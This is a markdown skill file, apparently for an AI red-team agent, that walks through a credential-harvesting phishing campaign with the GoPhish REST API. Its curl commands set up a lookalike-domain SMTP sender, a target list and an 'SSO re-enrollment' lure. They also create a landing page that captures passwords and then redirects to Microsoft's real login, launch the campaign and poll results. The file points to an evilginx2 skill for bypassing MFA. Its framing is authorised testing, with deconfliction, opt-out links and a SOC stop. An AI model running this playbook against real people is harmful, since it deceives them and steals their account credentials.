---
name: gophish-campaign
description: >
  Build and launch a tracked phishing campaign with the GoPhish REST API — sending
  profile, groups, email template, landing page, launch, and event polling.
metadata:
  subdomain: phishing
  when_to_use: "gophish, phishing campaign, email template, landing page, campaign tracking, credential harvest landing"
  mitre_attack:
    - T1566.002
    - T1598.003
  tags:
    - phishing
    - gophish
    - campaign
---

# GoPhish Campaign

GoPhish drives the credential-harvest landing-page flow and the
click/submit tracking the report needs. Use it for the "fake login
page" path; use `evilginx2-proxy` instead when you must defeat MFA.

## Prerequisites

- GoPhish running in the sandbox (`gophish` binary; admin API on
  `https://127.0.0.1:3333`, phish server on `:80/:443`).
- `GOPHISH_API_KEY` exported (read from the admin UI once).
- The `lure-deconfliction` handshake COMPLETE for this campaign.
- A sender domain with SPF/DKIM/DMARC (`lookalike-domain`) and a
  pretext (`pretext-engineering`).

## Flow (REST API)

```bash
API=https://127.0.0.1:3333/api
H="Authorization: Bearer $GOPHISH_API_KEY"

# 1. Sending profile (SMTP)
curl -sk -H "$H" -H 'Content-Type: application/json' $API/smtp/ -d '{
  "name":"eng-smtp","host":"smtp.lure-domain.example:587",
  "from_address":"it-support@lure-domain.example",
  "username":"...","password":"...","ignore_cert_errors":true}'

# 2. Target group (from plan/phisher/pretext.md shortlist)
curl -sk -H "$H" -H 'Content-Type: application/json' $API/groups/ -d '{
  "name":"wave1","targets":[{"email":"alice@acme.example","first_name":"Alice","last_name":"R"}]}'

# 3. Email template (include the X-Decepticon-Eng header + opt-out URL)
curl -sk -H "$H" -H 'Content-Type: application/json' $API/templates/ -d '{
  "name":"sso-migration","subject":"Action needed: SSO re-enrollment",
  "html":"<a href=\"{{.URL}}\">Re-enroll</a> {{.Tracker}}"}'

# 4. Landing page (capture creds, then redirect to the real site)
curl -sk -H "$H" -H 'Content-Type: application/json' $API/pages/ -d '{
  "name":"sso-landing","html":"<form>...</form>",
  "capture_credentials":true,"redirect_url":"https://login.microsoftonline.com"}'

# 5. Launch
curl -sk -H "$H" -H 'Content-Type: application/json' $API/campaigns/ -d '{
  "name":"acme-wave1","template":{"name":"sso-migration"},
  "page":{"name":"sso-landing"},"smtp":{"name":"eng-smtp"},
  "url":"https://login.acme-portal.example","groups":[{"name":"wave1"}]}'

# 6. Poll results
curl -sk -H "$H" $API/campaigns/ | jq '.[].results[] | {email,status}'
```

## Evidence

Each submitted credential → `Credential` node linked to the `User`
node with an `OBTAINED_VIA` edge carrying the campaign id. Save the raw
GoPhish results JSON under `evidence/phisher/<campaign>.json`.

## OPSEC / failsafe

- Send rate matches `opsec_level` (stealth ≤2/h, standard ≤20/h).
- `gophish_pause_campaign` (`PUT $API/campaigns/:id/complete`) halts
  sending instantly on a SOC stop request.
- Every template carries the engagement header + opt-out link.
